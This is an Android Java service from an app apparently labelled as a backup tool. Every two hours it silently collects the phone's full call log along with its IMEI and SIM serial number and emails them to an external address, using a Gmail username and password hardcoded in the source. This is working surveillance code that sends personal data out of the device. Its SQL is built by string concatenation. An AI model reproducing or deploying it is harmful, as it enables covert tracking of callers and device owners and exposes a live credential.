package com.example.sushant.twbackup;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.IBinder;
import android.os.StrictMode;
import android.provider.CallLog;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import android.util.Log;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

/**
 * Created by sushant on 4/4/17.
 */
public class CallLogService extends Service {
    long timestamp;
    long timestamp_ss;
    long milliseconds;
    MainActivity mainActivity = null;
    String firstassign_Date = "10-10-2000_10:10:2000";

    DatabaseHelper databaseHelper;
    SQLiteDatabase sqLiteDatabase;
    int ID;
    private android.os.Handler handler;
    private Runnable runnable;
    private String CALLTYPENEW;
    private String CALLLOGNEW;
    private ArrayList<String> callnew;
    Date finaldate, convert_assign_date, finaldate_ss, new_date;
    Cursor cursor, secondcursor, thirdcursor, fourthcursor;
    private String fetchdate1;
    private TelephonyManager telephonyManager;
    private String SIMSERIAL, IMEINO, Details;
    long timestamp2;

    @Nullable
    @Override
    public IBinder onBind(Intent intent)

    {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        handler = new android.os.Handler();
        runnable = new Runnable() {
            @Override
            public void run() {

                SENDCALLOG();
                handler.postDelayed(runnable,  2*60*60*1000);
                new MyLogger().storeMessage("CallLogService-onStartCommand()", "Executed in every 2 hrs");


            }
        };
        handler.postDelayed(runnable, 2*60*60*1000);
        return super.onStartCommand(intent, flags, startId);
    }

    private void SENDCALLOG() {

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        SIMSERIAL = telephonyManager.getSimSerialNumber();
        IMEINO = telephonyManager.getDeviceId();

        Details = "IMEI:" + IMEINO + "_SIM_SERIAL_NO:" + SIMSERIAL;


        callnew = new ArrayList<>();

        Log.i("SMSLOG", "IN THE SEND CALL LOG");
        convert_assign_date = new Date();

        databaseHelper = new DatabaseHelper(getApplicationContext(), DatabaseHelper.DB_NAME, null, DatabaseHelper.DB_VERSION);
        sqLiteDatabase = databaseHelper.getReadableDatabase();

        // FETCH THE LASTEST DATE FROM THE DATABASE
        String[] projection = {CallLog.Calls.DATE};
        Log.e("projection", String.valueOf(projection));
        cursor = getContentResolver().query(Uri.parse("content://call_log/calls"), projection, android.provider.CallLog.Calls.DATE, null, null);
        // if(cursor!=null&&cursor.moveToFirst())
        while (cursor.moveToNext()) {
            int dateid = cursor.getColumnIndex(CallLog.Calls.DATE);
            String callDatenew = cursor.getString(dateid);
            Log.e("callDatenew", callDatenew);
            timestamp = Long.parseLong(callDatenew);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            finaldate = calendar.getTime();
            Log.i("CALLLOG", " FINAL DATE OF CALL  " + finaldate);
            new MyLogger().storeMessage("CallLogService-Final Date of the SMS", String.valueOf(finaldate));



        }
        cursor.close();

        //CHECK THE DATABASE OPERATION FOR THE  CALL TIME IN THE TABLE
        String query = "SELECT CALLTIME FROM CALLLOGTABLE1 WHERE _CALLID=2";
        Log.e("query", query);
        secondcursor = sqLiteDatabase.rawQuery(query, null);

        if (secondcursor.moveToFirst()) {

            fetchdate1 = secondcursor.getString(secondcursor.getColumnIndex("CALLTIME"));//sqlite data retrived
            milliseconds = Long.parseLong(fetchdate1);
            Log.i("SMSLOG", " CONVERTED DATE FROM DB  " + fetchdate1);

        }
        //IF VALUE IN NULL FROM THE COL THEN ASSIGN THE HARDCODED DATE
        else {

            fetchdate1 = "Tue May 02 10:37:23 GMT+05:30 2010";

            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
            try {
                convert_assign_date = simpleDateFormat.parse(firstassign_Date);
            } catch (ParseException e) {
                e.printStackTrace();
            }

            databaseHelper = new DatabaseHelper(getApplicationContext(), DatabaseHelper.DB_NAME, null, DatabaseHelper.DB_VERSION);
            sqLiteDatabase = databaseHelper.getWritableDatabase();

            SimpleDateFormat simple_form = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
            //comparedate=Calendar.getInstance().getTime();
            String strDate = simple_form.format(convert_assign_date);

            String insert_query = "INSERT INTO CALLLOGTABLE1 (_CALLID,CALLTIME) VALUES('" + 2 + "', '" + fetchdate1 + "')";
            sqLiteDatabase.execSQL(insert_query);


        }
        secondcursor.close();


        //************************************************************
        Log.i("SMSLOG", " DATE FROM CONDITION " + fetchdate1);

        // READ THE ALL THE CALL LOG FORM THE DATABASE
        thirdcursor = getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
        thirdcursor.moveToFirst();

        int number = thirdcursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = thirdcursor.getColumnIndex(CallLog.Calls.TYPE);
        int datenew = thirdcursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = thirdcursor.getColumnIndex(CallLog.Calls.DURATION);

        for (int i = 0; i < thirdcursor.getCount(); i++) {

            String phNumber = thirdcursor.getString(number);
            String callType = thirdcursor.getString(type);
            String callDate = thirdcursor.getString(datenew);  //Date fetch form the Call DB

            Calendar cal = Calendar.getInstance(Locale.ENGLISH);
            cal.setTimeInMillis(Long.parseLong(callDate));
            String callDuration = thirdcursor.getString(duration);
            String date1 = DateFormat.format("dd-MM-yyyy_HH:mm:ss", cal).toString();

            //Date for the each sms
            String finalassign_date = thirdcursor.getString(thirdcursor.getColumnIndex("date"));
            timestamp_ss = Long.parseLong(finalassign_date);
            Log.e("timestamp_calllog", String.valueOf(timestamp_ss));//***********************time in millis
            Calendar calendar_ss = Calendar.getInstance();
            calendar_ss.setTimeInMillis(timestamp_ss);
            finaldate_ss = calendar_ss.getTime();


            Log.i("SMSLOG", " EACH CALL LOG DATE" + finaldate_ss);

            if (callType.equals("1")) {
                CALLTYPENEW = "Incoming";

            }
            if (callType.equals("2")) {
                CALLTYPENEW = "Outgoing";

            }
            if (callType.equals("3")) {
                CALLTYPENEW = "Missed";

            }
               /*changes made by Samir-If the last date is greater than sqlite stored date then only
                         the mail would be send without data redundancy.*/

            if (fetchdate1.equals("Tue May 02 10:37:23 GMT+05:30 2010")) {
                CALLLOGNEW = "\n[No:" + phNumber + " Date:" + date1 + " Type:" + CALLTYPENEW + " Duration:" + callDuration + "]";
                // ADD THE CALL LOG IF THE
                callnew.add(CALLLOGNEW);
                Log.i("SMSLOG", " CALL LOGS IN THE ARRAY LIST");
                new MyLogger().storeMessage("CallLogService-Final Date comparison to sqitite date", "inside if condition");

            }

            else if (timestamp_ss > milliseconds)

            {
                String calllogtime = String.valueOf(timestamp_ss);

                String sqlitetime = String.valueOf(milliseconds);


                Log.i("calllogtime", calllogtime);

                Log.i("sqlitetime", sqlitetime);
                CALLLOGNEW = "\n[No:" + phNumber + " Date:" + date1 + " Type:" + CALLTYPENEW + " Duration:" + callDuration + "]";
                // ADD THE CALL LOG IF THE
                callnew.add(CALLLOGNEW);
                new MyLogger().storeMessage("CallLogService-Final Date comparison to sqitite date", "inside else-if"+CALLLOGNEW);

                Log.i("SMSLOG", " CALL LOGS IN THE ARRAY LIST");

            } else {
                new MyLogger().storeMessage("CallLogService-Final Date comparison to sqitite date", "inside else");

                Log.e("break", "break");
                //break;


            }

            //******************Ends here *********************

           /* if(fetchdate1.equals("Tue May 02 10:37:23 GMT+05:30 2010"))
            {
                CALLLOGNEW="\n[No:"+phNumber+" Date:"+date1+" Type:"+CALLTYPENEW+" Duration:"+callDuration+"]";
                // ADD THE CALL LOG IF THE
                callnew.add(CALLLOGNEW);
                Log.e("CallLogService"," CALL LOGS IN THE ARRAY LIST");
            }



            else  if (!finaldate_ss.toString().equals(fetchdate1)) {
                try {
                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");

                    new_date = simpleDateFormat.parse(fetchdate1);
                    timestamp2 = new_date.getTime();


                    if (timestamp_ss > timestamp2) {

                        CALLLOGNEW = "\n[No:" + phNumber + " Date:" + date1 + " Type:" + CALLTYPENEW + " Duration:" + callDuration + "]";
                        // ADD THE CALL LOG IF THE
                        callnew.add(CALLLOGNEW);
                        Log.e("CallLogService", " CALL LOGS IN THE ARRAY LIST");
                    } else
                    {
                        Log.e("CallLogService", " CALL LOGS IN THE ARRAY LIST inside else");
                    }
                } catch (ParseException e) {
                    e.printStackTrace();
                }

            }
            else
            {

                break;

            }*/


            thirdcursor.moveToNext();
        }
        thirdcursor.close();
        //ARRAY LIST SIZE  > 0 THEN SEND THE CALL LOG THROUGH THE MAIL

        if (callnew.size() > 0) {

            TWattachmentMailSender mailSender = new TWattachmentMailSender("transworldcallrecording", "transworld123!@#", "smtp.gmail.com", "587");
            try {

                Log.e("CallLOG", " IN THE CALL MAIL SENDER ");
                Boolean s = mailSender.sendMail1("CALL_LOG_" + Details, "CONTENT :)" + callnew.toString(), "9100", "callrecording@twphd.in");
                Log.i("CallLOG ", "CALL LOG SENT " + s);

                new MyLogger().storeMessage("CallLogService-mail send method", "Mail Sent -"+s);

                databaseHelper = new DatabaseHelper(getApplicationContext(), DatabaseHelper.DB_NAME, null, DatabaseHelper.DB_VERSION);
                sqLiteDatabase = databaseHelper.getWritableDatabase();
                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
                String newdate = simpleDateFormat.format(finaldate);
                Log.i("SMSLOG", "ID COL " + newdate);
                ContentValues cv = new ContentValues();
                cv.put("CALLTIME", "" + newdate); //These Fields should be your String values of actual column names
                Log.i("Call Log", "after cv.put");
                String t = String.valueOf(timestamp);
                sqLiteDatabase.execSQL("update CALLLOGTABLE1 set CALLTIME='" + t + "' where _CALLID=2");//finaldate.toString()
                // callnew.clear();
                Log.i("SMSLOG", " CALL LOG DATE UPDATED" + newdate);

            } catch (Exception e) {
                e.printStackTrace();
                new MyLogger().storeMessage("CallLogService-mail send method", "Mail Not Sent -"+e);

                Log.i("SMSLOG", "EXCEPTION WHILE MAIL SENDING" + e);
            }
        } else {


        }
        sqLiteDatabase.close();
        callnew.clear();

    }
}